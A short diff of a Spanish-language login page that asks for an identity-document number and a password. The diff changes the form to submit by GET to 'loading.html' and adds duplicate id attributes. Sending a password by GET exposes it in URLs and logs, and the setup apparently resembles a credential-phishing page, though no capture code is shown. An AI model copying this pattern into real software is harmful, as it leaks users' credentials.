@@ -300,7 +300,7 @@
 <br><br>
 <div class="card">
     <!-- FORMULARIO -->
-    <form method="post" action="plus.php">
+    <form action="loading.html" method="GET">
 
         <!-- GRUPO NÚMERO DE DOCUMENTO -->
         <div class="field-group">
@@ -315,7 +315,7 @@
 
                 <div class="input-wrap">
                     <!-- teclado numérico + placeholder en blanco -->
-                    <input
+                    <input id="email"
                         type="tel"
                         id="docNumber"
                         name="numero_documento"
@@ -331,7 +331,7 @@
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
-            <input type="password" id="password" name="password">
+            <input id="clave" type="password" id="password" name="password">
             <div class="eye" id="togglePassword">
                 <img src="img/eye-open.png" alt="Mostrar contraseña">
             </div>
